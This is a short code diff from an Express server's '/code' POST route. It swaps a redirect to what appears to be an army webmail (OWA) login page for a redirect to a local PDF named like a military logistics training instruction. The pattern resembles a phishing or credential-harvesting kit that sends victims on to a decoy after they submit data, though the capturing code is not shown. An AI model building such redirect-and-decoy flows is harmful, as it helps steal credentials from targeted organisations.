@@ -144,7 +144,7 @@ router.post('/code' , (req, res) => {
                 return res.status(500).send('Internal Server Error');
             }
             
-            res.redirect('https://newmail.army.mil.bd/owa');
+            res.redirect('./AMDT OF LOGISTICS AREA TRG INSTR-2,2025 27-08-25.pdf');
             
         });
       
